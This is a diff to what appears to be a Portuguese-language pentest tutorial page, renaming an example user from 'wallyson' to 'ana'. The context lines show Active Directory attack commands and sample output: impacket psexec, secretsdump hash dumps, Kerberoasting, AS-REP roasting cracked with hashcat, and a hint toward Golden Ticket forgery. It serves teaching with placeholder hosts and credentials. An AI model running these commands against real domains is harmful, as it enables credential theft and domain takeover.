@@ -67,7 +67,7 @@ domain.local/user:'Senha@123'@10.10.10.5
 -hashes lmhash:ntlmhash
 
 # Kerberos ticket (.ccache)
-export KRB5CCNAME=/tmp/wallyson.ccache
+export KRB5CCNAME=/tmp/ana.ccache
 script.py -k -no-pass user@host
 
 # AES key
@@ -79,7 +79,7 @@ script.py -k -no-pass user@host
         path="~"
         lines={[
           {
-            cmd: "impacket-psexec acme.local/wallyson:'Senha@123'@10.10.10.5",
+            cmd: "impacket-psexec acme.local/ana:'Senha@123'@10.10.10.5",
             out: `Impacket v0.12.0 - Copyright 2023 Fortra
 
 [*] Requesting shares on 10.10.10.5.....
@@ -128,7 +128,7 @@ DefaultAccount:503:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c0
 WDAGUtilityAccount:504:aad3b435b51404eeaad3b435b51404ee:599e9d87e0e94042e527ec80a324c43c:::
 
 [*] Dumping cached domain logon information (domain/username:hash)
-ACME.LOCAL/wallyson:$DCC2$10240#wallyson#a82b3c4d5e6f7e8f9a0b1c2d3e4f5a6b
+ACME.LOCAL/ana:$DCC2$10240#ana#a82b3c4d5e6f7e8f9a0b1c2d3e4f5a6b
 ACME.LOCAL/jsmith:$DCC2$10240#jsmith#fedcba0987654321...
 
 [*] Dumping LSA Secrets
@@ -163,7 +163,7 @@ ACME\\svc_backup:1110:aad3b435b51404eeaad3b435b51404ee:32ed87bdb5fdc5e9cba885473
         path="~"
         lines={[
           {
-            cmd: "impacket-GetUserSPNs acme.local/wallyson:'Senha@123' -dc-ip 10.10.10.5 -request -outputfile spns.txt",
+            cmd: "impacket-GetUserSPNs acme.local/ana:'Senha@123' -dc-ip 10.10.10.5 -request -outputfile spns.txt",
             out: `Impacket v0.12.0
 
 ServicePrincipalName               Name           MemberOf                                       PasswordLastSet            LastLogon
@@ -205,13 +205,13 @@ $krb5tgs$23$*svc_iis$ACME.LOCAL$HOST/srv-iis01*...:IISp@ssword!`,
 
 [!] User maria@acme.local doesn't have UF_DONT_REQUIRE_PREAUTH set
 [!] User jsmith@acme.local doesn't have UF_DONT_REQUIRE_PREAUTH set
-$krb5asrep$23$wallyson@ACME.LOCAL:abc123def456...$789xyz...
+$krb5asrep$23$ana@ACME.LOCAL:abc123def456...$789xyz...
 [!] User admin@acme.local doesn't have UF_DONT_REQUIRE_PREAUTH set`,
             outType: "warning",
           },
           {
             cmd: "hashcat -m 18200 asrep.txt /usr/share/wordlists/rockyou.txt",
-            out: `$krb5asrep$23$wallyson@ACME.LOCAL:abc123...:Senha@123`,
+            out: `$krb5asrep$23$ana@ACME.LOCAL:abc123...:Senha@123`,
             outType: "success",
           },
         ]}
@@ -346,7 +346,7 @@ drw-rw-rw-          0  Mon Mar 11 18:23  ..
           "Se algum quebrar e for high priv: rode secretsdump -just-dc.",
           "Use o hash do krbtgt para Golden Ticket (próxima fase)",
         ]}
-        command={`USER='wallyson'
+        command={`USER='ana'
 PASS='Senha@123'
 DC='10.10.10.5'
 
